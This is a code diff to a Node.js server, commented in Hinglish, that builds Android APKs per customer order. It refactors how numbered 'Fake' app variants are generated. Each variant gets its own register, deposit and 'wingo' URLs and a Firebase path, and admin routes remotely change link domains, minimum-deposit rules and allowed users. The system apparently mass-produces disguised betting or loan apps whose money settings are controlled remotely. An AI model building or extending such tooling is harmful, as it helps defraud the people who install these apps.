@@ -513,26 +513,18 @@ app.post('/api/order', requireAuth, iconUpload.single('icon'), async (req, res) 
       let fakeResult = null;
       // ── Fake APK build if addon enabled ──
       if (fakeAddonEnabled && cleanFakeRegisterUrl) {
-        logPush('\n--- Building Fake APK ---');
-        const fakeOrder = {
-          ...order,
-          is_fake: true,
-          app_name: order.app_name + ' Fake',
-          package_name: 'com.zayrof.' + packageName.split('.').pop(),
-          register_url: cleanFakeRegisterUrl,
-          deposit_url: buildUrls(cleanFakeRegisterUrl, isDhaniDesign).deposit,
-          wingo_url: buildUrls(cleanFakeRegisterUrl, isDhaniDesign).wingo,
-          domain: extractDomain(cleanFakeRegisterUrl),
-          firebase_path: order.fake_firebase_path
-            || `zayrof${extractDomain(cleanFakeRegisterUrl).replace(/[^a-z0-9]/gi,'').substring(0,8)}`
-        };
+        logPush('\n--- Building Fake APK (Fake 1) ---');
+        const fakeOrder = makeFakeOrder(order, cleanFakeRegisterUrl,
+          order.fake_firebase_path
+            || `zayrof${extractDomain(cleanFakeRegisterUrl).replace(/[^a-z0-9]/gi,'').substring(0,8)}`,
+          1, design);
         const fakeBuildId = buildId + '_fake';
         fakeResult = await buildApk(fakeOrder, design, fakeBuildId, logPush);
         if (fakeResult.success) {
           db.prepare('UPDATE orders SET fake_apk_file=? WHERE id=?').run(fakeResult.apkFile, orderId);
-          logPush('Fake APK ready!');
+          logPush('Fake 1 APK ready!');
         } else {
-          logPush('Fake APK build failed: ' + fakeResult.error);
+          logPush('Fake 1 APK build failed: ' + fakeResult.error);
         }
       }
 
@@ -632,23 +624,33 @@ function isDhaniOrder(order) {
 
 // ── Fake site APK helpers (primary fake + multiple extra fake sites) ──
 // Fake APK ke liye order object banata hai: apna register link, apna
-// firebase path, unique package name (har fake site side-by-side install
-// ho sake).
-function makeFakeOrder(order, registerUrl, firebasePath, packageSuffix, design) {
+// firebase path, apna NAAM ("Fake 1", "Fake 2"...) + unique package name
+// (har fake site side-by-side install ho sake, sab alag dikhein).
+function makeFakeOrder(order, registerUrl, firebasePath, fakeNumber, design) {
   const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
   const isDhani = isDhaniOrder({ ...order, design_category: design?.category, design_java_type: design?.java_type });
   const urls = buildUrls(registerUrl, isDhani);
+  const pkgBase = String(order.package_name || 'com.zayro.app').split('.').pop() || 'app';
   return {
     ...order,
     is_fake: true,
-    app_name: order.app_name + ' Fake',
-    package_name: 'com.zayrof.' + String(order.package_name || 'com.zayro.app').split('.').pop() + (packageSuffix || ''),
+    app_name: order.app_name + ' Fake ' + fakeNumber,
+    package_name: 'com.zayrof.' + pkgBase + 'f' + fakeNumber,
     register_url: registerUrl,
     deposit_url: urls.deposit,
     wingo_url: urls.wingo,
     domain: extractDomain(registerUrl),
     firebase_path: firebasePath
   };
+}
+
+// Fake numbering: primary fake (orders.fake_register_url) = Fake 1,
+// extra sites (order_fake_sites, sort_order se) = Fake 2, 3, 4...
+function getFakeNumber(order, siteId) {
+  const sites = getOrderFakeSites(order.id);
+  const hasPrimary = !!(order.fake_register_url && String(order.fake_register_url) !== '');
+  const idx = sites.findIndex(s => s.id === siteId);
+  return (hasPrimary ? 2 : 1) + (idx >= 0 ? idx : sites.length);
 }
 
 // Ek fake site row ke liye Firebase path banata hai (unique per site id)
@@ -675,16 +677,17 @@ async function buildFakeSiteApk(order, design, site, buildIdSuffix, logPush) {
     return null;
   }
   db.prepare('UPDATE order_fake_sites SET status=? WHERE id=?').run('building', site.id);
-  logPush(`\n--- Building Fake Site APK #${site.id} (${site.register_url}) ---`);
-  const fakeOrder = makeFakeOrder(order, site.register_url, site.firebase_path, 'f' + site.id, design);
+  const fakeNumber = getFakeNumber(order, site.id);
+  logPush(`\n--- Building Fake Site APK #${site.id} (Fake ${fakeNumber} — ${site.register_url}) ---`);
+  const fakeOrder = makeFakeOrder(order, site.register_url, site.firebase_path, fakeNumber, design);
   const result = await buildApk(fakeOrder, design, buildIdSuffix, logPush);
   if (result.success) {
     db.prepare('UPDATE order_fake_sites SET apk_file=?, status=? WHERE id=?').run(result.apkFile, 'done', site.id);
-    logPush(`Fake site #${site.id} APK ready!`);
+    logPush(`Fake ${fakeNumber} APK ready!`);
     return result;
   }
   db.prepare('UPDATE order_fake_sites SET status=? WHERE id=?').run('failed', site.id);
-  logPush(`Fake site #${site.id} build failed: ${result.error || 'Build failed'}`);
+  logPush(`Fake ${fakeNumber} build failed: ${result.error || 'Build failed'}`);
   return null;
 }
 
@@ -1494,7 +1497,7 @@ app.get('/api/admin/users/:id/orders', requireAdmin, (req, res) => {
 
   // Har order ke extra fake sites bhi bhejo (multiple fake APKs)
   for (const o of orders) {
-    o.fake_sites = getOrderFakeSites(o.id);
+    o.fake_sites = getOrderFakeSites(o.id).map(s => ({ ...s, fake_number: getFakeNumber(o, s.id) }));
     o.fake_sites_count = o.fake_sites.length;
   }
 
@@ -1511,16 +1514,32 @@ app.get('/api/admin/users/:id/orders', requireAdmin, (req, res) => {
 
 function getOrderFirebaseTarget(order, variant = 'real') {
   const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
-  if (variant === 'fake') {
+  const v = String(variant || 'real');
+  if (v === 'fake') {
     if (!order.fake_register_url) throw new Error('This order has no Fake APK');
     const domain = extractDomain(order.fake_register_url);
     const firebasePath = order.fake_firebase_path
       || `zayrof${domain.replace(/[^a-z0-9]/gi, '').substring(0, 8)}`;
     return {
       variant: 'fake',
+      fakeNumber: 1,
       firebasePath,
       registerUrl: order.fake_register_url,
       urls: buildUrls(order.fake_register_url, isDhaniOrder(order))
+    };
+  }
+  // Extra fake site: variant = 'fs<siteId>' (Fake 2, 3, ...)
+  if (/^fs\d+$/.test(v)) {
+    const fsid = parseInt(v.slice(2), 10);
+    const site = db.prepare('SELECT * FROM order_fake_sites WHERE id=? AND order_id=?').get(fsid, order.id);
+    if (!site) throw new Error('Fake site not found');
+    return {
+      variant: v,
+      fakeNumber: getFakeNumber(order, fsid),
+      fakeSiteId: fsid,
+      firebasePath: site.firebase_path,
+      registerUrl: site.register_url,
+      urls: buildUrls(site.register_url, isDhaniOrder(order))
     };
   }
   return {
@@ -1567,26 +1586,17 @@ function rebuildOrderInBackground(orderId, rebuildFake = true) {
     const apkPaths = [result.apkPath];
     let fakeResult = null;
     if (rebuildFake && order.fake_register_url) {
-      const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
-      const fakeUrls = buildUrls(order.fake_register_url, isDhaniOrder({ ...order, design_category: design.category, design_java_type: design.java_type }));
-      const fakeOrder = {
-        ...order,
-        is_fake: true,
-        app_name: order.app_name + ' Fake',
-        package_name: 'com.zayrof.' + String(order.package_name || '').split('.').pop(),
-        register_url: order.fake_register_url,
-        deposit_url: fakeUrls.deposit,
-        wingo_url: fakeUrls.wingo,
-        domain: extractDomain(order.fake_register_url),
-        firebase_path: order.fake_firebase_path || `zayrof${extractDomain(order.fake_register_url).replace(/[^a-z0-9]/gi,'').substring(0,8)}`
-      };
-      logPush('\n--- Rebuilding Fake APK ---');
+      const { extractDomain } = require('./utils/htmlprocessor');
+      logPush('\n--- Rebuilding Fake APK (Fake 1) ---');
+      const fakeOrder = makeFakeOrder(order, order.fake_register_url,
+        order.fake_firebase_path || `zayrof${extractDomain(order.fake_register_url).replace(/[^a-z0-9]/gi,'').substring(0,8)}`,
+        1, design);
       fakeResult = await buildApk(fakeOrder, design, buildId + '_fake', logPush);
       if (fakeResult.success) {
         db.prepare('UPDATE orders SET fake_apk_file=? WHERE id=?').run(fakeResult.apkFile, order.id);
         apkPaths.push(fakeResult.apkPath);
       } else {
-        logPush('Fake APK rebuild failed: ' + (fakeResult.error || 'Build failed'));
+        logPush('Fake 1 APK rebuild failed: ' + (fakeResult.error || 'Build failed'));
       }
     }
     // ── EXTRA FAKE SITES bhi rebuild karo (har site ka apna APK) ──
@@ -1619,9 +1629,12 @@ function getOrderFakeSites(orderId) {
 }
 
 app.get('/api/admin/orders/:id/fake-sites', requireAdmin, (req, res) => {
-  const order = db.prepare('SELECT id FROM orders WHERE id=?').get(req.params.id);
+  const order = db.prepare('SELECT * FROM orders WHERE id=?').get(req.params.id);
   if (!order) return res.status(404).json({ error: 'Order not found' });
-  res.json(getOrderFakeSites(req.params.id));
+  res.json(getOrderFakeSites(req.params.id).map(s => ({
+    ...s,
+    fake_number: getFakeNumber(order, s.id)
+  })));
 });
 
 // Naye fake sites add karo + har ek ka APK build (background me)
@@ -1840,14 +1853,24 @@ app.post('/api/admin/orders/create', requireAdmin, iconUpload.single('icon'), as
 
 
 // Complete Firebase manager for each APK from Admin > Users > APKs.
+// variant: 'real' | 'fake' (Fake 1) | 'fs<id>' (Fake 2, 3, ...)
 app.get('/api/admin/orders/:id/firebase', requireAdmin, async (req, res) => {
   const order = getAdminOrder(req.params.id);
   if (!order) return res.status(404).json({ error: 'Order not found' });
   try {
-    const target = getOrderFirebaseTarget(order, req.query.variant === 'fake' ? 'fake' : 'real');
+    const rawVariant = String(req.query.variant || 'real');
+    const variant = rawVariant === 'fake' || /^fs\d+$/.test(rawVariant) ? rawVariant : 'real';
+    const target = getOrderFirebaseTarget(order, variant);
     const state = await getFirebaseControl(target.firebasePath);
     const users = Object.entries(state.users).map(([key, value]) => ({ key, value }));
     users.sort((a, b) => a.key.localeCompare(b.key));
+    // Fake variants list — UI me "Fake 1", "Fake 2"... dikhane ke liye
+    const fake_sites = getOrderFakeSites(order.id).map(s => ({
+      id: s.id,
+      fake_number: getFakeNumber(order, s.id),
+      register_url: s.register_url,
+      firebase_path: s.firebase_path
+    }));
     res.json({
       order: {
         id: order.id,
@@ -1855,9 +1878,11 @@ app.get('/api/admin/orders/:id/firebase', requireAdmin, async (req, res) => {
         username: order.username,
         design_name: order.design_name,
         has_fake: !!order.fake_register_url,
+        fake_sites,
         live_link_enabled: order.live_link_enabled === 1
       },
       variant: target.variant,
+      fake_number: target.fakeNumber || null,
       firebase_path: target.firebasePath,
       register_url: target.registerUrl,
       config: {
@@ -1878,7 +1903,8 @@ app.get('/api/admin/orders/:id/firebase', requireAdmin, async (req, res) => {
 app.patch('/api/admin/orders/:id/firebase/link', requireAdmin, async (req, res) => {
   const order = getAdminOrder(req.params.id);
   if (!order) return res.status(404).json({ error: 'Order not found' });
-  const variant = req.body.variant === 'fake' ? 'fake' : 'real';
+  const rawVariant = String(req.body.variant || 'real');
+  const variant = rawVariant === 'fake' || /^fs\d+$/.test(rawVariant) ? rawVariant : 'real';
   const changeType = req.body.change_type === 'invite' ? 'invite' : 'domain';
   try {
     const target = getOrderFirebaseTarget(order, variant);
@@ -1892,7 +1918,11 @@ app.patch('/api/admin/orders/:id/firebase/link', requireAdmin, async (req, res) 
       depositUrl: urls.deposit,
       wingoUrl: urls.wingo
     });
-    if (variant === 'fake') {
+    if (target.fakeSiteId) {
+      // Extra fake site — uski row update karo (path wahi rehta hai)
+      db.prepare('UPDATE order_fake_sites SET register_url=?,deposit_url=?,wingo_url=?,domain=? WHERE id=?')
+        .run(registerUrl, urls.deposit, urls.wingo, extractDomain(registerUrl), target.fakeSiteId);
+    } else if (variant === 'fake') {
       db.prepare('UPDATE orders SET fake_register_url=?,fake_firebase_path=? WHERE id=?')
         .run(registerUrl, target.firebasePath, order.id);
     } else {
@@ -1909,7 +1939,8 @@ app.patch('/api/admin/orders/:id/firebase/config', requireAdmin, async (req, res
   const order = getAdminOrder(req.params.id);
   if (!order) return res.status(404).json({ error: 'Order not found' });
   try {
-    const target = getOrderFirebaseTarget(order, req.body.variant === 'fake' ? 'fake' : 'real');
+    const rawVariant = String(req.body.variant || 'real');
+    const target = getOrderFirebaseTarget(order, rawVariant === 'fake' || /^fs\d+$/.test(rawVariant) ? rawVariant : 'real');
     const values = {
       minDeposit: req.body.min_deposit,
       depositCondition: req.body.deposit_condition === true || req.body.deposit_condition === 'true',
@@ -1929,7 +1960,8 @@ app.post('/api/admin/orders/:id/firebase/users', requireAdmin, async (req, res) 
   const order = getAdminOrder(req.params.id);
   if (!order) return res.status(404).json({ error: 'Order not found' });
   try {
-    const target = getOrderFirebaseTarget(order, req.body.variant === 'fake' ? 'fake' : 'real');
+    const rawVariant = String(req.body.variant || 'real');
+    const target = getOrderFirebaseTarget(order, rawVariant === 'fake' || /^fs\d+$/.test(rawVariant) ? rawVariant : 'real');
     const user = await addFirebaseUser(target.firebasePath, req.body.user_key);
     res.json({ success: true, user });
   } catch (error) {
@@ -1941,7 +1973,8 @@ app.delete('/api/admin/orders/:id/firebase/users/:userKey', requireAdmin, async 
   const order = getAdminOrder(req.params.id);
   if (!order) return res.status(404).json({ error: 'Order not found' });
   try {
-    const target = getOrderFirebaseTarget(order, req.query.variant === 'fake' ? 'fake' : 'real');
+    const rawVariant = String(req.query.variant || 'real');
+    const target = getOrderFirebaseTarget(order, rawVariant === 'fake' || /^fs\d+$/.test(rawVariant) ? rawVariant : 'real');
     const removed = await removeFirebaseUser(target.firebasePath, req.params.userKey);
     res.json({ success: true, removed });
   } catch (error) {
